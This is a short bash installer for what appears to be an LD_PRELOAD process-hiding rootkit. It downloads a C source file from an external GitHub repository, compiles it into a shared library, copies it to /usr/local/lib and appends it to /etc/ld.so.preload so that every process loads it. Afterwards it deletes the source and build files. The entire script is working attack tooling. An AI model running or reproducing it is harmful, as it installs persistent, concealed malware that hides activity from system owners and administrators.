#!/bin/bash
apt-get install gcc wget -y 1>/dev/null

LDR="wget"

if [ -s /usr/bin/wget ];
	then LDR="wget" ;
else LDR="curl -o prhid.c" ;
fi

if [[ -d hidf ]] ; then
	cd hidf/ && chmod +x prhid.c
	gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
else
	$LDR https://github.com/0x-raafet/onion_farm/raw/main/hidf/prhid.c
	gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
fi
cp libprhid.so /usr/local/lib/
echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload

if [[ -f libprhid.so || -f /etc/ld.so.preload ]] ;
	then printf "%-20s %20s\n" " hidsetup" "[  DONE  ]" ;
else printf "%-20s %20s\n" " hidsetup" "[  FAILED  ]" ;
fi
rm libprhid.so prhid.c 2>/dev/null
